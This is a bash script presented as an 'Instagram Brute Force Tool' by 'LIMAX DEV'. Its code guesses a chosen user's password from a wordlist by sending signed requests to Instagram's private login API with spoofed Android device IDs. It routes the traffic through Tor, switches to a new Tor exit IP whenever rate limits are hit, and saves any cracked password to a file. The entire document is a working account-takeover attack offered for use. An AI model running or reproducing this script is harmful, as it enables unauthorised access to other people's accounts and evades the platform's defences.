#!/bin/bash

# Adicionar toque de áudio quando o banner carrega
if [ -f "Fred.wav" ]; then
    # Tenta tocar o arquivo .wav (dependendo do sistema)
    if command -v aplay > /dev/null 2>&1; then
        aplay Fred.wav > /dev/null 2>&1 &
    elif command -v paplay > /dev/null 2>&1; then
        paplay Fred.wav > /dev/null 2>&1 &
    elif command -v afplay > /dev/null 2>&1; then
        afplay Fred.wav > /dev/null 2>&1 &
    fi
fi

trap 'store;exit 1' 2
string4=$(openssl rand -hex 32 | cut -c 1-4)
string8=$(openssl rand -hex 32  | cut -c 1-8)
string12=$(openssl rand -hex 32 | cut -c 1-12)
string16=$(openssl rand -hex 32 | cut -c 1-16)
device="android-$string16"
uuid=$(openssl rand -hex 32 | cut -c 1-32)
phone="$string8-$string4-$string4-$string4-$string12"
guid="$string8-$string4-$string4-$string4-$string12"
var=$(curl -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
var2=$(echo $var | awk -F ';' '{print $2}' | cut -d '=' -f3)

dependencies() {
command -v openssl > /dev/null 2>&1 || { echo >&2 "❌ I require openssl but it's not installed. Aborting."; exit 1; }
command -v tor > /dev/null 2>&1 || { echo >&2 "❌ I require tor but it's not installed. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "❌ I require curl but it's not installed. Aborting."; exit 1; }
command -v awk > /dev/null 2>&1 || { echo >&2 "❌ I require awk but it's not installed. Aborting."; exit 1; }
command -v cat > /dev/null 2>&1 || { echo >&2 "❌ I require cat but it's not installed. Aborting."; exit 1; }
command -v tr > /dev/null 2>&1 || { echo >&2 "❌ I require tr but it's not installed. Aborting."; exit 1; }
command -v wc > /dev/null 2>&1 || { echo >&2 "❌ I require wc but it's not installed. Aborting."; exit 1; }
command -v cut > /dev/null 2>&1 || { echo >&2 "❌ I require cut but it's not installed. Aborting."; exit 1; }
command -v uniq > /dev/null 2>&1 || { echo >&2 "❌ I require uniq but it's not installed. Aborting."; exit 1; }
command -v sed > /dev/null 2>&1 || { echo >&2 "❌ I require sed but it's not installed. Aborting."; exit 1; }
if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
echo "/dev/urandom not found!"
exit 1
fi
}

banner() { 
printf "\e[1;91m"  # Define cor vermelha para o banner

banner_ascii="                                                                        
                                                ...:+@@@%-..                                        
                                            ..:+%@@@@@@@@@%.                                        
                                            .%@@@@@@@@@@@@@%.                                       
                                            .@@@@@@@@@@@@@@@%*.                                     
                                            .@@@@@@@@@@@@@@@@%. ..-:.                               
                     .::..                  .#@@@@@@@@@@@@@@@@##@@@=.                               
                       .+#:                 .=@@@@@@@@@@@@@@@@@@#..                                 
                        ..+*.            ....-@@@@@@@@@@@@@@@@@@@.                                  
                          ..%:.         .=@@@@@@@@@@@@@@@@@@@@@@@..                                 
               .+#*-....    .#+..      .+@@@@@@@@@@@@@@@@@@@@@@@@.                                  
                    .*@*...  -@@:              -@@@@@@@@@@@@@@@@@@-..                               
                       .:%@%=.%@@=    ..        -@@@@@@@@@@@@@@@@@@@=..                             
            .:+*-.....  ..-@@@@@@@*..*@+.       .+@@@@@@@@@@@@@@@@@@@@%=..                          
                 ..-=#%@%#*+*@@@@@@*.@@:         ..#@@@@@@@@@@@@@@@@@@@@@#..                        
                       .:*@@@@@@@@@@@@@:          ..:@@@@@@@@@@@@@@@@@@@@@@@+..                     
                       ..-=*@@@@@@@@@@@:             .=@@@@@@@@@@@@@@@@@@@@@@@#..                   
           ....:::---+@@@@@@@@@@@@@@@@@-...         .-@@@@@@@@@@@@@@@@@@@@@@@@@@=..                 
                              +@@@@@@@@@@@-         =@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..                
                              .=@@@@@@@@@@        ..@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=                
                               ...%@@@@@@@@..     .#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:.             
                                  .:=@@@@@@@%.   .:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+.             
                                    .-@@@@@@@@@+..@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#.             
                                      :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-.            
                                      ..@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:            
                                        .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+..          
                                         ..@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@..          
                                           .-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@..          
                                             .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@..          
                                             ..@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
                                             .:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
                                             .+@@@@@@@@@@@@@@@@@@@@@@%.+@@@@@@@@@@@@@@@@:.          
                                             .=@@@%@#@@@@@@@@@@@@@@@@#.-@@@@@@@@@@@@@@@@..          
                                             ...-%:: .=@@@@@#..=@@-.=#.:@@@@@@@@@@@@@@@=.           
                                                :-.:  .:@@:..  .=+. :*.:@@@@@@@@@@@@@#+.            
                                                -+.+  .:@..     :=. := :@@@@@@@@.:@@@=-.            
                                                #@.+   .-       .-..-- :@@@@@-%....@@--             
                                                ...+  .::       .: .*= :@@@@@.=.. .=@.-             
                                                  .*  ..:      .-: .%#.:@+%@%.%.. .-#.-             
                                                  .*  .::      .-. .#+.:+..+..#.. .-=.-.            
                                                  .#  .+-      .#:.    :+.        .--.=.            
                                                  .%. .@=      .%+.    -%.        .#*.*.            
                                                  .%. .@-            ..=@:.       .@@:#.            
                                                  .%. ...            ..@@*..      ...-%.            
                                                 .-@=                ..*@:.          +@.            
                                                 ..%:                                =%.            
                                                  ..                                 ...            
                                                                                              "

echo -e "$banner_ascii"
printf "\e[0m"  # Reseta a cor para o padrão
}

cat <<EOF
By LIMAX DEV
EOF

function start() {
banner
printf "\n\e[1;92m Instagram Brute Force Tool\n"
printf "\e[1;92m Developed by: LIMAX DEV\n\n"


# Verifica dependências
dependencies

read -p $'\e[1;92m 📝 Enter The Username For The Account: \e[0m' user

# Verifica se o usuário existe
checkaccount=$(curl -s https://www.instagram.com/$user/?__a=1 | grep -c "The User May Have Been Banned Or Page Being Deleted/Non-Exsistance/No User (With this username)" 2>/dev/null)
if [[ "$checkaccount" == 1 ]] || [[ -z "$user" ]]; then
    printf "\e[1;91m ❌ Invalid Username Entered! Try Again\e[0m\n"
    sleep 1
    start
else
    default_wl_pass="default-passwords.lst"
    read -p $'\e[1;92m 📃 Enter The name Of Password List (Press Enter For Default List): \e[0m' wl_pass
    wl_pass="${wl_pass:-${default_wl_pass}}"
    
    # Verifica se o arquivo de senhas existe
    if [ ! -f "$wl_pass" ]; then
        printf "\e[1;91m ❌ Password file '$wl_pass' not found!\n"
        printf "\e[1;92m Please create a passwords.txt file with passwords to test.\n\e[0m"
        exit 1
    fi
    
    default_threads="10"
    read -p $'\e[1;92m 🔗 Threads To Use While Testing Passwords (1-20, Default-10): \e[0m' threads
    threads="${threads:-${default_threads}}"
    
    # Valida o número de threads
    if ! [[ "$threads" =~ ^[0-9]+$ ]] || [ "$threads" -lt 1 ] || [ "$threads" -gt 20 ]; then
        printf "\e[1;91m ❌ Invalid number of threads! Using default (10)\n\e[0m"
        threads=10
    fi
    
    printf "\n\e[1;92m [+] Starting attack on user: \e[1;77m%s\e[0m\n" "$user"
    printf "\e[1;92m [+] Using password list: \e[1;77m%s\e[0m\n" "$wl_pass"
    printf "\e[1;92m [+] Using threads: \e[1;77m%s\e[0m\n" "$threads"
    printf "\e[1;91m [!] Press Ctrl+C to stop or save session\n\e[0m"
    sleep 2
fi
}

checktor() {
check=$(curl --socks5 localhost:9050 -s https://check.torproject.org > /dev/null; echo $?)
if [[ "$check" -gt 0 ]]; then
    printf "\e[1;91m 🧅 TOR not running! Starting TOR service...\e[0m\n"
    service tor start 2>/dev/null || systemctl start tor 2>/dev/null || /etc/init.d/tor start 2>/dev/null
    sleep 3
    check=$(curl --socks5 localhost:9050 -s https://check.torproject.org > /dev/null; echo $?)
    if [[ "$check" -gt 0 ]]; then
        printf "\e[1;91m ❌ Cannot connect to TOR. Please install/start TOR manually.\n\e[0m"
        printf "\e[1;92m On Debian/Ubuntu: sudo apt install tor\n"
        printf "\e[1;92m Start TOR: sudo service tor start\n\e[0m"
        exit 1
    fi
fi
}

function store() {
if [[ -n "$threads" ]]; then
    printf "\n\e[1;91m [*] Waiting for threads to finish...\n\e[0m"
    if [[ "$threads" -gt 10 ]]; then
        sleep 6
    else
        sleep 3
    fi
    default_session="Y"
    printf "\n\e[1;77m 📲 Save session for user \e[0m\e[1;92m %s \e[0m" $user
    read -p $'\e[1;77m? ❓ [Y/n]: \e[0m' session
    session="${session:-${default_session}}"
    if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" ]]; then
        if [[ ! -d sessions ]]; then
            mkdir sessions
        fi
        printf "user=\"%s\"\npass=\"%s\"\nwl_pass=\"%s\"\n" $user $pass $wl_pass > sessions/store.session.$user.$(date +"%FT%H%M")
        printf "\e[1;77m ✔️ Session saved.\e[0m\n"
        printf "\e[1;92m Use ./instashell --resume\n"
    else
        exit 1
    fi
else
    exit 1
fi
}

function changeip() {
killall -HUP tor 2>/dev/null
sleep 2
}

function bruteforcer() {
checktor
count_pass=$(wc -l "$wl_pass" 2>/dev/null | cut -d " " -f1)
if [ -z "$count_pass" ] || [ "$count_pass" -eq 0 ]; then
    printf "\e[1;91m ❌ Password file is empty or not found!\n\e[0m"
    exit 1
fi

printf "\e[1;92mUsername:\e[0m\e[1;77m %s\e[0m\n" "$user"
printf "\e[1;92mWordlist:\e[0m\e[1;77m %s (%s passwords)\e[0m\n" "$wl_pass" "$count_pass"
printf "\e[1;92mThreads:\e[0m\e[1;77m %s\e[0m\n" "$threads"
printf "\e[1;91m[*] Starting brute force attack...\n"
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"

startline=1
endline="$threads"
attempts=0

while [ true ]; do
    IFS=$'\n'
    for pass in $(sed -n ''$startline','$endline'p' "$wl_pass" 2>/dev/null); do
        if [ -z "$pass" ]; then
            continue
        fi
        
        header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
        data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
        ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"

        countpass=$(grep -n "^$pass$" "$wl_pass" 2>/dev/null | cut -d ":" -f1 | head -1)
        if [ -z "$countpass" ]; then
            countpass=$((attempts + 1))
        fi
        
        hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" 2>/dev/null | cut -d " " -f2)
        
        printf "\e[1;77m[%s/%s] Testing: %s\e[0m\n" "$countpass" "$count_pass" "$pass"
        
        {(trap '' SIGINT && var=$(curl --socks5 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" 2>/dev/null | grep -o "200\|challenge\|many tries\|Please wait" | uniq); 
        
        if [[ $var == "challenge" ]]; then 
            printf "\n\e[1;92m ✅ Password Found: %s\n" "$pass"
            printf "\e[1;92m ⚠️ Challenge required (2FA/Verification needed)\n"
            printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords
            printf "\e[1;92m [+] Saved to: found.passwords\n\e[0m"
            kill -1 $$ 
        elif [[ $var == "200" ]]; then 
            printf "\n\e[1;92m ✅✅✅ PASSWORD FOUND: %s\n" "$pass"
            printf "\e[1;92m ✅ Login successful!\n"
            printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.passwords
            printf "\e[1;92m [+] Saved to: found.passwords\n\e[0m"
            kill -1 $$  
        elif [[ $var == "many tries" ]] || [[ $var == "Please wait" ]]; then 
            printf "\e[1;91m ⚠️ Rate limit detected, changing IP...\n\e[0m"
            changeip
        fi; ) } &
        
        attempts=$((attempts + 1))
        sleep 0.5
        
    done
    
    wait
    
    let startline+=$threads
    let endline+=$threads
    
    if [ $startline -gt $count_pass ]; then
        printf "\n\e[1;91m ❌ No password found in the list.\n\e[0m"
        printf "\e[1;92m Try with a different password list.\n"
        exit 0
    fi
    
    changeip
    sleep 1
done
}

function resume() {
banner 
checktor
counter=1
if [[ ! -d sessions ]]; then
    printf "\e[1;91m[*] No sessions found\n\e[0m"
    exit 1
fi

printf "\e[1;92mSaved sessions:\n\e[0m"
for list in $(ls sessions/store.session* 2>/dev/null); do
    IFS=$'\n'
    source "$list" 2>/dev/null
    printf "\e[1;92m%s \e[0m\e[1;77m: %s (user: %s, wordlist: %s)\e[0m\n" "$counter" "$list" "$user" "$wl_pass"
    let counter++
done

if [ $counter -eq 1 ]; then
    printf "\e[1;91m[*] No valid sessions found\n\e[0m"
    exit 1
fi

read -p $'\e[1;92mChoose a session number: \e[0m' fileresume
session_file=$(ls sessions/store.session* 2>/dev/null | sed ''$fileresume'q;d')

if [ -z "$session_file" ] || [ ! -f "$session_file" ]; then
    printf "\e[1;91m ❌ Invalid session selection\n\e[0m"
    exit 1
fi

source "$session_file"
default_threads="10"
read -p $'\e[1;92mThreads (Use < 20, Default 10): \e[0m' threads
threads="${threads:-${default_threads}}"

printf "\e[1;92m[*] Resuming session for user: \e[0m \e[1;77m%s\e[0m\n" "$user"
printf "\e[1;92m[*] Wordlist: \e[0m \e[1;77m%s\e[0m\n" "$wl_pass"
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
sleep 2

bruteforcer
}

# Main execution
case "$1" in 
    --resume) 
        resume 
        ;;
    *)
        start
        bruteforcer
        ;;
esac

